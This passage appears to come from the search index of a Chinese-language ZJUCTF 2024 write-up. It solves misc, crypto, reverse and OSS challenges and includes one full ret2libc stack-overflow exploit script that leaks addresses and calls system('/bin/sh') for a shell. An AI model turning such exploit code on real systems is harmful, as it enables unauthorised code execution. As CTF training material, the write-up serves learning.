with Blockbench</code>\uff0c\u90a3\u5c31\u7528 blockbench \u6253\u5f00\u8fd9\u4e2a\u6a21\u578b\u6587\u4ef6\uff0c\u5f97\u5230\uff1a</p> <p>\u5f97\u5230 <code>Flag Piece[4/9]:X20wXmVf</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#flag-piece-5","title":"Flag Piece 5","text":"<p>It seems that the mod only change the appearance of mobs. However, a certain mob didn't seems right by other people without the mod. People used be able to harvest this special shinny stick form her bones. However, due to the heavy demand of flags, nowadays she hides it behind some encryption so that you can't get them.</p> <p>\u610f\u601d\u662f flag \u85cf\u5728 testmod \u4e2d\u3002\u53cd\u7f16\u8bd1 <code>testmod-Alpha.1.0.0.jar</code>\uff0c\u627e\u5230 <code>TestMobEntity.class</code>\uff0c\u6709\u4e2a <code>decrypt</code> \u65b9\u6cd5\uff1a</p> <pre><code>private void decrypt() {\n    byte[] tmp = (byte[])mask.clone();\n    byte[] tmp1 = this.lore[0].getBytes(StandardCharsets.US_ASCII);\n    for (int i = 0; i &lt; mask.length; i++)\n        tmp[i] = (byte)(tmp[i] ^ tmp1[i]); \n    this.lore[0] = new String(tmp);\n}\n</code></pre> <p>\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e0b\u8fd9\u4e2a\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u5f97\u5230 <code>Flag Piece[5/9]:RnVuX2xm</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#flag-piece-6","title":"Flag Piece 6","text":"<p>There's 9 regions that does not belong to this world, however both worlds are rooted from the same seed, The string is the only different between our version and the other. Many taking some schemetics and compare the two would be a good idea. Note: this piece is not an item!</p> <p>\u610f\u601d\u662f\u5b58\u6863\u4e2d\u6709\u4e2a\u5730\u65b9\u585e\u4e86\u51e0\u4e2a\u5176\u4ed6\u4e16\u754c\u7684\u533a\u57df\uff0c\u8981\u627e\u4e0d\u540c\u3002</p> <p>\u5728\u5b58\u6863\u76ee\u5f55\u4e0b\u627e\u5230 <code>region</code> \u6587\u4ef6\u5939\uff0c\u770b\u5230\u51e0\u4e2a\u53ef\u7591\u7684\u533a\u57df\u6587\u4ef6\uff1a</p> <p>\u7b97\u4e00\u4e0b\u5750\u6807\uff0ctp \u8fc7\u53bb\u770b\u770b\uff0c\u53d1\u73b0\u8fd9\u8fb9\u53ea\u6709\u4e00\u4e2a\u533a\u5757\uff08\u7b97\u5750\u6807\u53c2\u8003 mcwiki\uff09\uff0c\u5750\u6807\u5927\u6982\u5728 <code>394410 ~ -14256522</code>\u3002</p> <p><code>/seed</code> \u67e5\u770b\u79cd\u5b50\uff0c\u518d\u7528\u76f8\u540c\u7684\u79cd\u5b50\u65b0\u5efa\u4e00\u4e2a\u9ed8\u8ba4\u4e16\u754c\uff0c\u4f20\u9001\u5230\u5bf9\u5e94\u533a\u5757\uff08\u8fd9\u91cc\u4f5c\u8005\u641e\u9519\u5750\u6807\u4e86\uff0c\u8981\u7528 hint \u7ed9\u7684\u5750\u6807\uff09\u3002</p> <p>\u90a3\u4e48\u5982\u4f55\u6bd4\u8f83\u533a\u5757\u5dee\u5f02\u5462\uff1f\u7ecf\u5e38\u73a9\u751f\u7535\u7684\u670b\u53cb\u80af\u5b9a\u77e5\u9053\uff0clitematica \u5c31\u662f\u5e72\u8fd9\u4e2a\u7684\u3002</p> <p>\u88c5\u4e2a litematica\uff0c\u5c06\u6574\u4e2a\u533a\u5757\u4fdd\u5b58\u4e3a\u539f\u7406\u56fe\u3002\u56de\u5230\u539f\u5b58\u6863\uff0c\u653e\u7f6e\u539f\u7406\u56fe\uff0c\u548c\u5730\u56fe\u4e2d\u7684\u533a\u5757\u5bf9\u9f50\uff0c\u7136\u540e\u6253\u5f00\u6295\u5f71\u7684\u539f\u7406\u56fe\u9a8c\u8bc1\u9009\u4e2d\u6240\u6709\u4e0d\u540c\u7684\u65b9\u5757\uff0c\u53ef\u4ee5\u770b\u5230\uff1a</p> <p>\u5f97\u5230 <code>Flag Piece[6/9]:X3kwdV9w</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#flag-piece-8","title":"Flag Piece 8","text":"<p>I think there will be some gold decorations in the house of the village gold smith, that is if their house do spawn. Only if there's some block that let you see their houses...</p> <p>\u201ctheir house do spawn\u201d \u6697\u793a\u9700\u8981\u627e\u5230\u65b9\u5f0f\u751f\u6210\u8fd9\u4e2a\u7ed3\u6784\u3002\u6570\u636e\u5305\u4e0b <code>main/structures</code> \u4e2d\u6709\u4e2a <code>gold_smith.nbt</code>\uff0c\u5e94\u8be5\u662f\u7ed3\u6784\u6587\u4ef6\u3002\u7528 structure block \u751f\u6210\uff0c\u7ed3\u6784\u540d\u79f0\u586b <code>main:gold_smith</code>\uff0c\u5373\u53ef\u52a0\u8f7d\u7ed3\u6784\uff1a</p> <p>\u7ed3\u6784\u5185\u7684\u7bb1\u5b50\u91cc\u627e\u5230 deocration\uff1a</p> <p>\u5f97\u5230 <code>Flag Piece[8/9]:X2N1NXRP</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#obtain-the-flag","title":"Obtain the Flag","text":"<p>\u5c06\u6240\u6709 flag piece \u7ec4\u5408\u8d77\u6765\uff0c\u5f97\u5230 <code>WkpVQ1RGe01pTkVjcjRmNydzX20wXmVfRnVuX2xmX3kwdV9wSUF5X2lUX2N1NXRPbWl6RUR9</code>\uff0cbase64 \u89e3\u7801\u5f97\u5230 flag <code>ZJUCTF{MiNEcr4f7's_m0^e_Fun_lf_y0u_pIAy_iT_cu5tOmizED}</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#_1","title":"\u9505\u91cc\u635e\u9762","text":"<p>\u7ed9\u4e86\u4e00\u4e2a\u56db\u5c0f\u65f6\u7684 mp4\uff0c\u753b\u9762\u662f AAA logo\uff0c\u97f3\u9891\u662f\u566a\u58f0\u3002</p> <p>\u636e\u8bf4\u6765\u81ea CCBC \u7684\u4f20\u5947\u7535\u62a5\u5458\u53ef\u4ee5\u4e00\u53e3\u6c14\u53d1\u56db\u4e2a\u5c0f\u65f6\u7535\u62a5\u2026\u2026</p> <p>\u90a3\u5c31\u662f\u6469\u65af\u7535\u7801\u4e86\uff0c\u628a\u97f3\u9891\u4e22\u8fdb audacity\uff0c\u770b\u5230\u6ce2\u5f62\uff0c\u53d1\u73b0\u6709\u89c4\u5f8b\u7684\u957f\u77ed\u97f3\u3002\u5199\u4e2a\u811a\u672c\u89e3\u7801\uff1a</p> <pre><code>import wave\nimport numpy as np\nimport itertools\n\ndef compress(L, v):\n    values = [int(i &gt; v) for i in L]\n    return [(k, len(list(g))) for k, g in itertools.groupby(range(len(values)), values.__getitem__)]\n\ndef decompress(L):\n    return [L[i][0] for i in range(len(L)) for _ in range(L[i][1])]\n\naudio = wave.open('output.wav', 'rb')\nparams = audio.getparams()\nprint(params)\nnchannels, _, samplerate, nframes = params[:4]\n\nsamples = audio.readframes(nframes)\naudio.close()\n\nsamples = np.abs(np.frombuffer(samples, dtype=np.int16))\nprint(samples)\n\nfor i in range(15, len(samples) - 15):\n    if samples[i] == 0:\n        samples[i] = np.average(samples[i - 15:i + 15])\n\n# print(\"Start compressing...\")\ncompressed = compress(samples, 10000)\ncompressed = [(k, v) for k, v in compressed if v &gt; 20]\ncompressed = compress(decompress(compressed), 0)\n\n# Decode morse code\nfrom morseutils.translator import MorseCodeTranslator as mct\n\nL = compressed\nmorse = []\n\nfor i in range(len(L)):\n    if L[i][0] == 0 and L[i][1] &gt; 10000:\n        morse.append(' ')\n    elif L[i][0] == 1:\n        if L[i][1] &lt; 10000:\n            morse.append('.')\n        else:\n            morse.append('-')\n\nmorse_code = \"\".join(morse)[1:-1]\nprint(morse_code)\nprint(mct.decode(morse_code))\n</code></pre> <p>\u4fee\u6539\u81ea\u6253 CCBC \u65f6\u961f\u53cb\u5199\u7684\u811a\u672c\u3002\u5f97\u5230 <code>AYICIKQXHR320E7CHW4Y84ZGM954UG061H9QV9X2360TJJ37H9ABL42ABJH5BB</code>\u3002</p> <p>\u7136\u540e\u662f\u89c6\u9891\uff0c\u901a\u8fc7\u76ef\u5e27\u53ef\u4ee5\u53d1\u73b0\u6709\u4e9b\u5e27\u4f1a\u6709\u767d\u8272\u6216\u8005\u9ed1\u8272\u7684\u7ad6\u7ebf\uff0c\u770b\u7740\u50cf\u6761\u5f62\u7801\uff0c\u5199\u4e2a\u811a\u672c\u63d0\u53d6\u4e00\u4e0b\u6709\u7ad6\u7ebf\u7684\u5e27\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u7ad6\u7ebf\u4ece\u5de6\u5230\u53f3\u626b\u63cf\u4e86\u4e09\u6b21\uff08\u811a\u672c\u4ee3\u7801\u627e\u4e0d\u5230\u4e86\uff0c\u5c31\u4e0d\u653e\u4e86\uff09\u3002</p> <p>\u5199\u4e2a\u811a\u672c\u7ec4\u5408\u4e00\u4e0b\u7ad6\u7ebf\uff0c\u53ef\u4ee5\u770b\u5230\u6761\u5f62\u7801\uff0c\u4f46\u662f\u626b\u4e0d\u51fa\u6765\u3002</p> <p>\u6587\u4ef6\u540d\u63d0\u793a <code>\u4ee3\u53f7128</code>\uff0c\u8bf4\u660e\u662f code128 \u6761\u5f62\u7801\uff0c\u76f4\u63a5\u624b\u52a8\u89e3\u7801\uff1a</p> <pre><code>import cv2\nimport numpy as np\nimport os\nimport itertools\n\ndef compress(L, v):\n    values = [int(i &lt; v) for i in L]\n    return [(k, len(list(g))) for k, g in itertools.groupby(range(len(values)), values.__getitem__)]\n\ndef slice(img):\n    \"\"\"\n    \u53ea\u63d0\u53d6\u4e00\u884c\uff0c\u907f\u514d AAA logo \u5f71\u54cd\n    \"\"\"\n    return img[75:75+10, 0:-1]\n\n# \u6253\u5f00\u89c6\u9891\u6587\u4ef6\ncap = cv2.VideoCapture('\u4ee3\u53f7128.mp4')\n\nL = np.zeros(256) # \u8bb0\u5f55\ncon = [] # \u7ec4\u5408\n\nwhile True:\n    ret, frame = cap.read()\n    if not ret:\n        break\n\n    gray_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n    slice0 = gray_frame[75, :]\n\n    for i in range(256):\n        if slice0[i] &lt; 50 or slice0[i] &gt; 200:\n            if L[i] != 0:\n                con = np.concatenate((con, L[29:227]))\n                L = np.zeros(256)\n            L[i] = slice0[i]\n\ncon = np.concatenate((con, L[29:227]))\ncon = compress(con, 128)\n\ncap.release()\n\n# code128 table\ncode128_t = { \"212222\": \" \", \"222122\": \"!\", \"222221\": '\"', \"121223\": \"#\", \"121322\": \"$\", \"131222\": \"%\", \"122213\": \"&amp;\", \"122312\": \"'\", \"132212\": \"(\", \"221213\": \")\", \"221312\": \"*\", \"231212\": \"+\", \"112232\": \",\", \"122132\": \"-\", \"122231\": \".\", \"113222\": \"/\", \"123122\": \"0\", \"123221\": \"1\", \"223211\": \"2\", \"221132\": \"3\", \"221231\": \"4\", \"213212\": \"5\", \"223112\": \"6\", \"312131\": \"7\", \"311222\": \"8\", \"321122\": \"9\", \"321221\": \":\", \"312212\": \";\", \"322112\": \"&lt;\", \"322211\": \"=\", \"212123\": \"&gt;\", \"212321\": \"?\", \"232121\": \"@\", \"111323\": \"A\", \"131123\": \"B\", \"131321\": \"C\", \"112313\": \"D\", \"132113\": \"E\", \"132311\": \"F\", \"211313\": \"G\", \"231113\": \"H\", \"231311\": \"I\", \"112133\": \"J\", \"112331\": \"K\", \"132131\": \"L\", \"113123\": \"M\", \"113321\": \"N\", \"133121\": \"O\", \"313121\": \"P\", \"211331\": \"Q\", \"231131\": \"R\", \"213113\": \"S\", \"213311\": \"T\", \"213131\": \"U\", \"311123\": \"V\", \"311321\": \"W\", \"331121\": \"X\", \"312113\": \"Y\", \"312311\": \"Z\", \"332111\": \"[\", \"314111\": \"\\\\\", \"221411\": \"]\", \"431111\": \"^\", \"111224\": \"_\", \"111422\": \"`\", \"121124\": \"a\", \"121421\": \"b\", \"141122\": \"c\", \"141221\": \"d\", \"112214\": \"e\", \"112412\": \"f\", \"122114\": \"g\", \"122411\": \"h\", \"142112\": \"i\", \"142211\": \"j\", \"241211\": \"k\", \"221114\": \"l\", \"413111\": \"m\", \"241112\": \"n\", \"134111\": \"o\", \"111242\": \"p\", \"121142\": \"q\", \"121241\": \"r\", \"114212\": \"s\", \"124112\": \"t\", \"124211\": \"u\", \"411212\": \"v\", \"421112\": \"w\", \"421211\": \"x\", \"212141\": \"y\", \"214121\": \"z\", \"412121\": \"{\", \"111143\": \"|\", \"111341\": \"}\", \"131141\": \"~\"}\n\nres = \"\"\n\nfor i in range(0, len(con), 6):\n    c = con[i : i + 6]\n    code = \"\"\n    for j in range(6):\n        code += str(c[j][1])\n        print(code, code128_t[code])\n        res += code128_t[code]\n\nprint(res)\n</code></pre> <p>\u5f97\u5230 <code>BASE36ENCODETABLE:ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789</code>\u3002</p> <p>\u610f\u601d\u662f\u7528\u81ea\u5b9a\u4e49\u7684 base36 \u7f16\u7801\u8868\u89e3\u7801\u4e0a\u9762\u90a3\u4e32\u5bc6\u6587\uff0c\u5199\u4e2a\u811a\u672c\u89e3\u7801\uff1a</p> <pre><code>import base36\n\ncustom_alphabet = \"ZJUCTF24ABDEGHIKLMNOPQRSVWXY01356789\"\ncode = \"AYICIKQXHR320E7CHW4Y84ZGM954UG061H9QV9X2360TJJ37H9ABL42ABJH5BB\"\n\ndef decode_custom_base36(code, alphabet):\n    # \u521b\u5efa\u5b57\u7b26\u5230\u503c\u7684\u6620\u5c04\u5b57\u5178\n    char_to_value = {char: index for index, char in enumerate(alphabet)}\n\n    # \u521d\u59cb\u5316\u89e3\u7801\u540e\u7684\u6570\u503c\n    decoded_value = 0\n\n    # \u904d\u5386\u7f16\u7801\u5b57\u7b26\u4e32\n    for char in code:\n        decoded_value = decoded_value * 36 + char_to_value[char]\n\n    return decoded_value\n\ndef base36_to_string(value):\n    result = []\n    while value &gt; 0:\n        result.append(chr(value % 256))\n        value //= 256\n    return ''.join(result[::-1])\n\n# \u4f7f\u7528\u81ea\u5b9a\u4e49\u5b57\u7b26\u96c6\u8fdb\u884c\u89e3\u7801\ndecoded_value = decode_custom_base36(code, custom_alphabet)\ndecoded_string = base36_to_string(decoded_value)\nprint(decoded_string)\n</code></pre> <p>\u5f97\u5230 flag <code>ZJUCTF{A_13G3nd4Ry_4h0uR-T3l36r4Phls7XD}</code></p>"},{"location":"ctf/writeups/zjuctf2024/#master-of-c","title":"Master of C++","text":"<p>\u4e22\u7ed9 GPT\uff0c\u7136\u540e\u8ba9\u5b83\u4e0d\u65ad\u538b\u7f29\u4ee3\u7801\uff0c\u6700\u540e\u81ea\u5df1\u7f29\u77ed\u4e00\u4e0b\u51fd\u6570\u53d8\u91cf\u540d\uff0c\u5f97\u5230\uff1a</p> <pre><code>template&lt;int N,int I&gt;struct pc{static const bool v=(N%I)&amp;&amp;(pc&lt;N,I-1&gt;::v);};\ntemplate&lt;int N&gt;struct pc&lt;N,1&gt;{static const bool v=true;};\ntemplate&lt;int N&gt;struct p{static const bool v=pc&lt;N,N/2&gt;::v;};\ntemplate&lt;&gt;struct p&lt;1&gt;{static const bool v=0;};\nint main(){return p&lt;ARG&gt;::v?0:1;}\n</code></pre> <p>\u5f97\u5230 flag <code>ZJUCTF{pR3m4tuR3_0PT1miz4t1oN_1s_thE_R00t_of_4LL_3v1l}</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#a","title":"\u5c0f A \u53e3\u7b97","text":"<p>\u6ca1\u4ec0\u4e48\u597d\u5199\u7684\uff0cpwntools \u4f7f\u7528\u6559\u7a0b\u7f62\u4e86\u3002\u4ee3\u7801\uff1a</p> <pre><code>from pwn import *\n\nio = remote('localhost', 61234)\n\nline = io.recvuntil(b'choice: ', drop=True)\nio.sendline(b'1')\n\nio.recvline()\nio.recvline()\nio.recvline()\n\nfor _ in range(200):\n    line = io.recvline()\n    a, b = map(int, line.split(b' ? '))\n    # print(a, b)\n    if a &lt; b:\n        io.sendline(b'&lt;')\n    elif a &gt; b:\n        io.sendline(b'&gt;')\n    else:\n        io.sendline(b'=')\n    print(io.recvline())\n    print(io.recvline())\n\nio.interactive()\n</code></pre>"},{"location":"ctf/writeups/zjuctf2024/#crypto","title":"Crypto","text":""},{"location":"ctf/writeups/zjuctf2024/#fib-i","title":"FIB \u2160","text":"<p>\u7ed9\u4e86 \\(p, k, (F_a, F_{a+1}), (F_b, F_{b+1})\\)\uff0c\u8981\u6c42\uff1a</p> <ol> <li>\\((F_{a+b}, F_{a+b+1})\\)</li> <li>\\((F_{k * a}, F_{k * a + 1})\\)</li> <li>\u4f7f\u5f97 \\((F_{a + c}, F_{a + c + 1}) = (0, 1)\\) \u7684 \\((F_c, F_{c+1})\\)</li> </ol> <p>\u4f7f\u7528\u5230\u7684\u6027\u8d28\u4e3a\uff1a</p> <ul> <li>\\(F_{n+k} = F_{k-1} * F_n + F_k * F_{n+1}\\)</li> <li>\\(F_{2n} = F_n * (F_{n-1} + F_{n+1})\\)</li> </ul> <p>\u7b2c\u4e00\u95ee\u53ef\u4ee5\u76f4\u63a5\u7528\u6027\u8d28 1 \u8ba1\u7b97\u3002</p> <p>\u7b2c\u4e8c\u95ee\u7528\u6027\u8d28 2\uff0c\u7c7b\u4f3c\u5feb\u901f\u5e42\uff0c\u5c06 \\(k\\) \u5206\u89e3\u4e3a\u4e8c\u8fdb\u5236\u3002\u636e\u8bf4\u76f4\u63a5\u7b97\u77e9\u9635\u5feb\u901f\u5e42\u4e5f\u53ef\u4ee5\uff0c\u4f46\u6ca1\u60f3\u5230\u3002</p> <p>\u7b2c\u4e09\u95ee\u7528\u6027\u8d28 1\uff0c\u5e26\u5165\u8fdb\u53bb\u89e3\u65b9\u7a0b\u5373\u53ef\u3002</p> <p>\u4ee3\u7801\uff1a</p> <pre><code>import math\nimport numpy as np\nimport sys\nfrom pwn import *\n\nsys.setrecursionlimit(2000)\n\ndef fib_plus(fibn : tuple, fibk: tuple) -&gt; tuple:\n    Fk, Fkp1 = fibk\n    Fn, Fnp1 = fibn\n    Fks1 = (Fkp1 - Fk + p) % p\n    Fnp2 = (Fn + Fnp1) % p\n    return (Fk * Fnp1 % p + Fks1 * Fn % p) % p, (Fk * Fnp2 % p + Fks1 * Fnp1 % p) % p\n\ndef fib_times_k(k : int, fib : tuple) -&gt; tuple:\n    if k == 0:\n        return 0, 1\n    if k == 1:\n        return fib\n    if k % 2 != 0:\n        return fib_plus(fib, fib_times_k(k - 1, fib))\n    fiba, fibap1 = fib_times_k(k // 2, fib)\n    fibas1 = (fibap1 - fiba + p) % p\n    fibap2 = (fiba + fibap1) % p\n    fib2a = fiba * ((fibap1 + fibas1) % p) % p\n    fib2ap2 = fibap1 * ((fibap2 + fiba) % p) % p\n    fib2ap1 = (fib2ap2 - fib2a + p) % p\n    return fib2a, fib2ap1\n\ndef fib_calc_c(fiba : tuple, fibapc : tuple) -&gt; tuple:\n    Fa, Fap1 = fiba\n    Fapc, Fapcp1 = fibapc\n    Fas1 = (Fap1 - Fa + p) % p\n    tmp = (Fap1 * Fas1 % p + p - Fa * Fa % p) % p\n    if tmp == p - 1:\n        Fnp1 = (Fa * Fapc % p - Fas1 * Fapcp1 % p + p) % p\n        Fn = (Fa * Fapcp1 % p - Fapc * Fap1 % p + p) % p\n    elif tmp == 1:\n        Fnp1 = (Fas1 * Fapcp1 % p - Fa * Fapc % p + p) % p\n        Fn = (Fapc * Fap1 % p - Fa * Fapcp1 % p + p) % p\n    return Fn, Fnp1\n\nio = remote('localhost', 61234)\n\nfor _ in range(10):\n    line = io.recvuntil(b'p = ', drop=True)\n    p = int(io.recvline())\n    line = io.recvuntil(b'k = ', drop=True)\n    k = int(io.recvline())\n    line = io.recvuntil(b'fib(a, p) = ', drop=True)\n    fiba = eval(io.recvline())\n    line = io.recvuntil(b'fib(b, p) = ', drop=True)\n    fibb = eval(io.recvline())\n    line = io.recvuntil(b'fib(a + b, p) = ', drop=True)\n    print(line)\n    res = fib_plus(fiba, fibb)\n    io.sendline(bytes(str(res[0] * p + res[1]).encode()))\n    line = io.recvuntil(b'fib(k * a, p) = ', drop=True)\n    print(line)\n    res = fib_times_k(k, fiba)\n    io.sendline(bytes(str(res[0] * p + res[1]).encode()))\n    line = io.recvuntil(b'if fib(a + c, p) = (0, 1), fib(c, p) = ', drop=True)\n    print(line)\n    res = fib_calc_c(fiba, (0, 1))\n    io.sendline(bytes(str(res[0] * p + res[1]).encode()))\n\nio.interactive()\n</code></pre>"},{"location":"ctf/writeups/zjuctf2024/#ezxor","title":"ezxor","text":"<p>\u7ed9\u7684\u4ee3\u7801\u5927\u6982\u662f\u5c06 flag \u8f6c\u4e3a 01 \u4e32\uff0c\u7136\u540e\u505a\u4e86\u540e\u7f00\u5f02\u6216\u548c\uff0c\u7136\u540e\u968f\u673a\u6311\u9009\u4e86 20 \u4e2a bit \u8fdb\u884c\u7ffb\u8f6c\u3002</p> <p>\u5148\u4e0d\u7ba1\u968f\u673a\u7ffb\u8f6c\uff0c\u5f02\u6216\u548c\u6bd4\u8f83\u7b80\u5355\uff0c\u4f5c\u5dee\u5206\u5c31\u8fd8\u539f\u4e86\uff1a</p> <pre><code>import random\n\n# \u7ed9\u5b9a\u7684\u52a0\u5bc6\u540e\u7684\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\nciphern\n# \u9006\u5411\u5f02\u6216\u64cd\u4f5c\nfor i in reversed(range(len(cipher))):\n    tmp = int(cipher[i]) ^ int(cipher[i - 1])\n    cipher = cipher[:i] + str(tmp) + cipher[i+1:]\n\n# \u9006\u5411 ASCII \u7f16\u7801\u64cd\u4f5c\nplain = ''\nfor i in range(0, len(cipher), 8):\n    plain += chr(int(cipher[i:i+8], 2))\nprint(plain)\n</code></pre> <p>\u5f97\u5230 <code>[\u00caUCF{Tell_do&gt;e!_Wel\u00a3\u00afme_to_YJUCTF_2&lt;24!}</code>\u3002</p> <p>\u9898\u76ee\u8bf4 Flag \u662f\u4e00\u6bb5\u7528\u4e0b\u5212\u7ebf\u4ee3\u66ff\u4e86\u7a7a\u683c\u7684\u6709\u610f\u4e49\u7684\u82f1\u6587\u53e5\u5b50\uff0c\u5176\u5b9e\u8fd9\u65f6\u5019\u5df2\u7ecf\u53ef\u4ee5\u770b\u51fa\u6765\u4e86\uff0cflag \u4e3a <code>ZJUCTF{Well_done!_Welcome_to_ZJUCTF_2024!}</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#shad0wtime","title":"Shad0wTime","text":"<p>\u975e\u9884\u671f\u505a\u7684\uff0c\u4e0d\u5199\u4e86\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#pwn","title":"Pwn","text":"<p>\u771f\u96be\u5427</p>"},{"location":"ctf/writeups/zjuctf2024/#easy-rop","title":"easy rop","text":"<p>\u7a0b\u5e8f\u5728 <code>read_name</code> \u4e2d\u4e0d\u65ad <code>read(STDIN_FILENO, name, 0x60);</code>\uff0c\u540c\u65f6 <code>name</code> \u6570\u7ec4\u5927\u5c0f\u53ea\u6709 48 \u5b57\u8282\uff0c\u5b58\u5728\u6808\u6ea2\u51fa\u3002</p> <p>checksec \u4e00\u4e0b\uff0c\u5f97\u5230\uff1a</p> <pre><code>Arch:       amd64-64-little\nRELRO:      Full RELRO\nStack:      No canary found\nNX:         NX enabled\nPIE:        PIE enabled\nStripped:   No\n</code></pre> <p>\u6ca1\u6709\u6808\u4fdd\u62a4\uff0c\u53ef\u4ee5\u76f4\u63a5\u8986\u76d6\u8fd4\u56de\u5730\u5740\u3002\u4f46\u662f\u5f00\u4e86\u6808\u4e0d\u53ef\u6267\u884c\u548c ASLR\uff0c\u63a8\u65ad\u662f ret2libc\u3002</p> <p>\u601d\u8def\u662f\u901a\u8fc7\u6cc4\u6f0f\u6808\u4e0a read_name \u548c main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u8ba1\u7b97 rop \u548c libc \u7684\u57fa\u5740\uff0c\u8986\u76d6\u8fd4\u56de\u5730\u5740\u8c03\u7528 <code>system('/bin/sh')</code>\u3002</p> <pre><code>#!/usr/bin/env python\nfrom pwn import *\nfrom pwnlib.util.packing import p64, u64\n\nrop = ELF('./rop')\nlibc = ELF(\"./libc-2.27.so\")\n# io = process('./rop')\nio = remote('127.0.0.1', 61234)\n\n# context.terminal = ['tmux', 'splitw', '-h']\n# pwnlib.gdb.attach(proc.pidof(io)[0], 'b read_name')\n\nlibc_offset = 0x0000000000021C87      # from libc-2.27.so\nread_name_offset = 0x00000000000008F5 # from rop\n\n# get rop base addr\noffset = 0x38\npayload = b'A' * offset\nio.recvuntil(b'please: ')\nio.send(payload)\nio.recvuntil(b'A' * offset)\nrecv = io.recv(6)\nadr = u64(recv.ljust(8, b'\\x00'))\nrop_base_addr = adr - read_name_offset\nrecv = io.recvuntil(b'please: ')\n# print(recv)\n\n# get libc base addr\noffset = 0x48\npayload = b'A' * offset\nio.send(payload)\nio.recvuntil(b'A' * offset)\nrecv = io.recv(6)\nadr = u64(recv.ljust(8, b'\\x00'))\n# print(hex(adr))\nlibc_base_addr = adr - libc_offset\n# print(\"libc_base_addr: \", hex(libc_base_addr))\nrecv = io.recvuntil(b'please: ')\n# print(recv)\n\n# use `ROPgadget --binary rop --only \"pop|ret\"` to find pop rdi; ret;\npop_rdi_ret_addr = 0x0000000000000963 + rop_base_addr\nmain = rop_base_addr + rop.symbols['main']\n\n# ret to main\noffset = 0x38\npayload = b'A' * offset\np_retn = 0x0000000000000666 + rop_base_addr\npayload += p64(p_retn)\npayload += p64(main)\n# print(hex(main))\nio.send(payload)\nrecv = io.recvuntil(b'please: ')\n# print(recv)\nio.send(b'ZJU\\0')\n\n# get shell\noffset = 0x38\nsys_addr = libc_base_addr + libc.symbols['system']\nbin_sh = libc_base_addr + next(libc.search(b'/bin/sh'))\n# print(hex(sys_addr), hex(bin_sh))\n# print(hex(libc.symbols['system']), hex(next(libc.search(b'/bin/sh'))))\npayload = b'A' * offset\npayload += p64(p_retn)\npayload += p64(pop_rdi_ret_addr)\npayload += p64(bin_sh)\npayload += p64(sys_addr)\nio.recvuntil(b'please: ')\nio.sendline(payload)\n\n# break loop to get shell\nrecv = io.recvuntil(b'please: ')\nio.send(b'ZJU\\0')\n\nio.interactive()\n</code></pre> <p>\u5f97\u5230 flag <code>ZJUCTF{@n_1a$y_R0p_cHalL_1N_x64|A7hdJk5wN7}</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#web","title":"Web","text":"<p>\u4e5f\u597d\u96be\uff0c\u53ea\u4f1a\u7b7e\u5230</p>"},{"location":"ctf/writeups/zjuctf2024/#easy-pentest","title":"easy Pentest","text":"<p>\u8bbf\u95ee\u5bc6\u94a5 AccessKey\uff08\u7b80\u79f0AK\uff09\u662f\u963f\u91cc\u4e91\u63d0\u4f9b\u7ed9\u7528\u6237\u7684\u6c38\u4e45\u8bbf\u95ee\u51ed\u636e\uff0c\u4e00\u7ec4\u7531 AccessKey ID \u548c AccessKey Secret \u7ec4\u6210\u7684\u5bc6\u94a5\u5bf9\u3002</p> <p>\u7ed9\u4e86 access key \u548c secret key\uff0c\u90a3\u76f4\u63a5\u751f\u6210\u7b7e\u540d\u5c31\u884c\u4e86\u3002</p> <pre><code>import oss2\n\n# \u4ece key.txt \u6587\u4ef6\u4e2d\u8bfb\u53d6\u51ed\u8bc1\u548c\u76ee\u6807 URL\naccess_key_id = ...\naccess_key_secret = ...\nendpoint = 'https://oss-cn-beijing.aliyuncs.com'\nbucket_name = 'oss-test-qazxsw'\n\nauth = oss2.Auth(access_key_id, access_key_secret)\nbucket = oss2.Bucket(auth, endpoint, bucket_name)\n\nresult = bucket.get_object('fffffflllllaaaagggg.txt')\nprint(result.read())\n</code></pre>"},{"location":"ctf/writeups/zjuctf2024/#reverse","title":"Reverse","text":""},{"location":"ctf/writeups/zjuctf2024/#rev-beginner-1","title":"rev beginner 1","text":"<p>IDA \u6253\u5f00\u76f4\u63a5\u5c31\u80fd\u770b\u5230 flag \u662f\u5982\u4f55\u9a8c\u8bc1\u7684\uff0c\u76f4\u63a5\u5199\u811a\u672c\u89e3\u5bc6\u5373\u53ef\u3002</p> <pre><code>#include &lt;iostream&gt;\n\nint main() {\n    char flag[31];\n    *(int *)&amp;flag[2] = 1180126042;\n    *(int *)&amp;flag[6] = 2038516568;\n    *(int *)&amp;flag[10] = 1953070957;\n    *(int *)&amp;flag[14] = -2072744833;\n    *(int *)&amp;flag[18] = 2089054334;\n    *(int *)&amp;flag[22] = 1451916667;\n    flag[26] = -107;\n    *(int *)&amp;flag[27] = 0;\n    for (int i = 0; i &lt;= 24; ++i) {\n        printf(\"%c\", flag[i + 2] - i);\n    }\n    return 0;\n}\n</code></pre> <p>\u5f97\u5230 flag <code>ZJUCTF{rev_is_fun_right?}</code>\u3002</p>"},{"location":"ctf/writeups/zjuctf2024/#rev-beginner-2","title":"rev beginner 2","text":"<p>\u7ed9\u7684\u53ef\u6267\u884c\u6587\u4ef6\u662f 80386 \u7684\uff0c\u7528\u4e86 <code>das</code> \u6307\u4ee4\uff0c\u6bcf\u4e2a\u5b57\u7b26\u662f\u72ec\u7acb\u7684\uff0c\u5206\u522b\u7206\u7834\u5c31\u884c\u3002</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nunsigned char af = 0, cf = 0;\n\nvoid das(unsigned char *al) {\n    if ((*al &amp; 0x0F) &gt; 9 || af == 1) {\n        *al -= 6;\n        af = 1;\n    } 